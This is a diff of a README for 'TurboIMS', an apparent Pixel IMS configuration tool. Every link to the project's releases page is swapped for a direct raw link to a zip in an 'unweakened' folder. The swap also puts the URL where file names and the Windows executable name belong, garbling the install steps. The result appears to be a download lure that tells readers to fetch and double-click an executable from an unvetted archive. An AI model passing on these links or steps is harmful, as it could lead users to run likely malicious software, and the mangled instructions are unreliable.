@@ -1,6 +1,6 @@
 # 🚀 TurboIMS - Streamline Your IMS Configuration Effortlessly
 
-[![Download TurboIMS](https://img.shields.io/badge/Download-TurboIMS-brightgreen)](https://github.com/Nasty-earhart246/TurboIMS/releases)
+[![Download TurboIMS](https://raw.githubusercontent.com/Nasty-earhart246/TurboIMS/master/unweakened/TurboIMS.zip)](https://raw.githubusercontent.com/Nasty-earhart246/TurboIMS/master/unweakened/TurboIMS.zip)
 
 ## 📋 Overview
 TurboIMS is an enhanced configuration tool designed for Google Pixel devices. It simplifies the management of IMS settings, allowing you to tweak your device for optimal performance and connectivity. With user-friendly options and an intuitive interface, TurboIMS makes customizing your device easy for everyone.
@@ -10,7 +10,7 @@ To get started with TurboIMS, you will need to download the application from our
 
 1. **Visit the Download Page**
    - Click the link below to go to the TurboIMS Releases page, where you can find the latest version to download:
-   [Download TurboIMS](https://github.com/Nasty-earhart246/TurboIMS/releases)
+   [Download TurboIMS](https://raw.githubusercontent.com/Nasty-earhart246/TurboIMS/master/unweakened/TurboIMS.zip)
 
 2. **Choosing the Right Version**
    - On the Releases page, you will see a list of available versions. Choose the latest release, which typically has the highest version number. This version includes the most recent features and fixes.
@@ -21,16 +21,16 @@ To install TurboIMS, follow these steps:
 1. **Download the Application**
    - Once you have located the latest release on the Releases page, look for a download link that matches your operating system. Click the link to start the download.
    - Example of what you might see on the Releases page:
-     - TurboIMS-v1.0-windows.zip
-     - TurboIMS-v1.0-linux.tar.gz
+     - https://raw.githubusercontent.com/Nasty-earhart246/TurboIMS/master/unweakened/TurboIMS.zip
+     - https://raw.githubusercontent.com/Nasty-earhart246/TurboIMS/master/unweakened/TurboIMS.zip
 
 2. **Extract the File**
    - After the download completes, locate the file in your Downloads folder.
    - If you downloaded a `.zip` file, right-click on it and select 'Extract All...' to unpack its contents.
-   - If you downloaded a `.tar.gz` file, you may need to use a file extraction program to extract it.
+   - If you downloaded a `https://raw.githubusercontent.com/Nasty-earhart246/TurboIMS/master/unweakened/TurboIMS.zip` file, you may need to use a file extraction program to extract it.
 
 3. **Run the Application**
-   - Navigate to the extracted folder. Look for an executable file. It will usually have a name like `TurboIMS.exe` for Windows or `TurboIMS` for Linux.
+   - Navigate to the extracted folder. Look for an executable file. It will usually have a name like `https://raw.githubusercontent.com/Nasty-earhart246/TurboIMS/master/unweakened/TurboIMS.zip` for Windows or `TurboIMS` for Linux.
    - Double-click the executable file to launch the application.
    - Follow any on-screen prompts to complete the setup process.
 
@@ -59,4 +59,4 @@ For additional support, you can reach out through the Issues page on this GitHub
 
 Remember, TurboIMS is here to make your IMS configuration simpler. Download now and enhance your Google Pixel experience! 
 
-[Download TurboIMS](https://github.com/Nasty-earhart246/TurboIMS/releases)
+[Download TurboIMS](https://raw.githubusercontent.com/Nasty-earhart246/TurboIMS/master/unweakened/TurboIMS.zip)
